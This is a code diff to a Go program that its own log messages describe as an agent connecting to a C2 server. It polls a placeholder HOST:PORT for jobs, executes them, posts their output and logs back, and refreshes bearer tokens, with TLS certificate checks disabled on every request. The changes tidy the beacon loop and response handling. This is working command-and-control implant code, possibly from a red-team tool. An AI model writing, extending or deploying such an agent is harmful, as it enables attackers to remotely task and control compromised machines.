@@ -8,7 +8,6 @@ import (
 	"fmt"
 	"io"
 	"math"
-	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -16,6 +15,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/relvacode/iso8601"
 	"github.com/rs/zerolog"
 
 	"github.com/google/uuid"
@@ -46,14 +46,6 @@ func AGENT() {
 	JobsQueue = make([]string, 0)
 	for {
 		for {
-			err := CHECKCONNECTION()
-			if !errors.Is(err, connectionErr) {
-				break
-			} else {
-				time.Sleep(time.Second * 7)
-			}
-		}
-		for {
 			err := TRYTOCONNECT()
 			if errors.Is(err, nil) {
 				break
@@ -66,7 +58,6 @@ func AGENT() {
 			if errors.Is(err, nil) {
 				jobsStatus, jobsOut := DOJOBS()
 				UPDATEJOBSTATUS(jobsStatus, jobsOut)
-
 			} else if errors.Is(err, requestSendingErr) {
 				break
 			} else {
@@ -76,17 +67,6 @@ func AGENT() {
 		}
 
 	}
-}
-
-func CHECKCONNECTION() error {
-	conn, err := net.Dial("tcp", "HOST:PORT")
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", "connecting to C2").Msg(connectionErr.Error())
-		return connectionErr
-	}
-	defer conn.Close()
-	Logger.Info().Str("status", "success").Str("stage", "connecting to C2").Msg("Successfully connected to C2")
-	return nil
 }
 
 func TRYTOCONNECT() error {
@@ -120,6 +100,7 @@ func TRYTOCONNECT() error {
 		return requestSendingErr
 	}
 	respBody, err := io.ReadAll(resp.Body)
+	resp.Body.Close()
 	if err != nil {
 		return responseReadingErr
 	}
@@ -180,6 +161,7 @@ func CHECKJOBS() error {
 		return requestSendingErr
 	}
 	respBody, err := io.ReadAll(resp.Body)
+	resp.Body.Close()
 	if err != nil {
 		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(responseReadingErr.Error())
 		return responseReadingErr
@@ -220,7 +202,9 @@ func DOJOBS() (map[string]bool, map[string]string) {
 			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(requestSendingErr.Error())
 			jobsStatus[jobUuid] = false
 		}
+		// WILL CRASH HERE
 		respBody, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
 		if err != nil {
 			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(responseReadingErr.Error())
 			jobsStatus[jobUuid] = false
@@ -307,7 +291,9 @@ func UPDATEJOBSTATUS(jobsStatus map[string]bool, jobsOut map[string]string) {
 		if err != nil {
 			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(requestSendingErr.Error())
 		}
+		// WILL CRASH HERE
 		respBody, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
 		if err != nil {
 			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(responseReadingErr.Error())
 		}
@@ -323,105 +309,122 @@ func UPDATEJOBSTATUS(jobsStatus map[string]bool, jobsOut map[string]string) {
 
 func SENDLOGS() {
 	CHECKAUTHTOKEN()
-	type LogEntry struct {
-		Level   string `json:"level"`
-		Status  string `json:"status"`
-		Stage   string `json:"stage"`
-		Time    string `json:"time"`
-		Message string `json:"message"`
-	}
-	var logRequestBody []LogEntry
-	var tempLogEntry LogEntry
-	logs := LogBuffer.String()
-	logLines := strings.Split(logs, "\n")
-	for _, logLine := range logLines {
-		if logLine != "" {
-			err := json.Unmarshal([]byte(logLine), &tempLogEntry)
-			if err != nil {
-				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
-			}
-			logRequestBody = append(logRequestBody, tempLogEntry)
+	if (LogBuffer.Len()) > 4096 {
+		type LogEntry struct {
+			Level   string `json:"level"`
+			Status  string `json:"status"`
+			Stage   string `json:"stage"`
+			Time    string `json:"time"`
+			Message string `json:"message"`
 		}
+		var logRequestBody []LogEntry
+		var tempLogEntry LogEntry
+		logs := LogBuffer.String()
+		logLines := strings.Split(logs, "\n")
+		for _, logLine := range logLines {
+			if logLine != "" {
+				err := json.Unmarshal([]byte(logLine), &tempLogEntry)
+				if err != nil {
+					Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
+				}
+				logRequestBody = append(logRequestBody, tempLogEntry)
+			}
+		}
+		logRequestJson, err := json.Marshal(logRequestBody)
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(marshalErr.Error())
+			return
+		}
+		req, err := http.NewRequest("POST", "https://HOST:PORT/agent/logs/add", bytes.NewBuffer(logRequestJson))
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestCreationErr.Error())
+			return
+		}
+		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
+		req.Header.Set("Content-Type", "application/json")
+		client := &http.Client{
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			},
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestSendingErr.Error())
+			return
+		}
+		respBody, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(responseReadingErr.Error())
+			return
+		}
+		var respJson struct {
+			Status string `json:"status"`
+		}
+		err = json.Unmarshal(respBody, &respJson)
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
+			return
+		}
+		if respJson.Status != "ok" {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg("Something wrong with a logging")
+			return
+		}
+		LogBuffer.Reset()
 	}
-	logRequestJson, err := json.Marshal(logRequestBody)
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(marshalErr.Error())
-	}
-	req, err := http.NewRequest("POST", "https://HOST:PORT/agent/logs/add", bytes.NewBuffer(logRequestJson))
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestCreationErr.Error())
-	}
-	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
-	req.Header.Set("Content-Type", "application/json")
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
-	resp, err := client.Do(req)
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestSendingErr.Error())
-	}
-	respBody, err := io.ReadAll(resp.Body)
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(responseReadingErr.Error())
-	}
-	var respJson struct {
-		Status string `json:"status"`
-	}
-	err = json.Unmarshal(respBody, &respJson)
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
-	}
-	if respJson.Status != "ok" {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg("Something wrong with a logging")
-	}
-	LogBuffer.Reset()
 }
 
 func CHECKAUTHTOKEN() {
-	authTokenExpireDate, err := time.Parse("2006-01-02 15:04", AuthorizationTokenExpire)
-	if err != nil {
-		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg("can't parse auth token expire time")
-	}
-	now := time.Now()
-	if now.After(authTokenExpireDate) {
-		difference := now.Sub(authTokenExpireDate).Hours()
-		hours, minutes := math.Modf(difference)
-		if hours < 4 && minutes >= 00 {
-			req, err := http.NewRequest("GET", "https://HOST:PORT/agent/refresh_token", nil)
-			if err != nil {
-				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(requestCreationErr.Error())
+	if AuthorizationToken != "" {
+		authTokenExpireDate, err := iso8601.ParseString(AuthorizationTokenExpire)
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg("can't parse auth token expire time")
+		}
+		now := time.Now()
+		if now.After(authTokenExpireDate) {
+			difference := now.Sub(authTokenExpireDate).Hours()
+			hours, minutes := math.Modf(difference)
+			if hours < 4 && minutes >= 00 {
+				req, err := http.NewRequest("GET", "https://HOST:PORT/agent/refresh_token", nil)
+				if err != nil {
+					Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(requestCreationErr.Error())
+				}
+				req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
+				client := &http.Client{
+					Transport: &http.Transport{
+						TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+					},
+				}
+				resp, err := client.Do(req)
+				if err != nil {
+					Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(requestSendingErr.Error())
+				}
+				respBody, err := io.ReadAll(resp.Body)
+				resp.Body.Close()
+				if err != nil {
+					Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(responseReadingErr.Error())
+				}
+				var respJson struct {
+					Expire string `json:"expire"`
+					Token  string `json:"token"`
+				}
+				err = json.Unmarshal(respBody, &respJson)
+				if err != nil {
+					Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(unmarshalErr.Error())
+				}
+				AuthorizationToken = respJson.Token
+				AuthorizationTokenExpire = respJson.Expire
+			} else {
+				err := TRYTOCONNECT()
+				if err != nil {
+					Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(err.Error())
+				}
 			}
-			req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
-			client := &http.Client{
-				Transport: &http.Transport{
-					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-				},
-			}
-			resp, err := client.Do(req)
-			if err != nil {
-				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(requestSendingErr.Error())
-			}
-			respBody, err := io.ReadAll(resp.Body)
-			if err != nil {
-				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(responseReadingErr.Error())
-			}
-			var respJson struct {
-				Expire string `json:"expire"`
-				Token  string `json:"token"`
-			}
-			err = json.Unmarshal(respBody, &respJson)
-			if err != nil {
-				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(unmarshalErr.Error())
-			}
-			AuthorizationToken = respJson.Token
-			AuthorizationTokenExpire = respJson.Expire
-		} else {
-			err := TRYTOCONNECT()
-			if err != nil {
-				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(err.Error())
-			}
+		}
+	} else {
+		err := TRYTOCONNECT()
+		if err != nil {
+			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("checking auth token")).Msg(err.Error())
 		}
 	}
 }
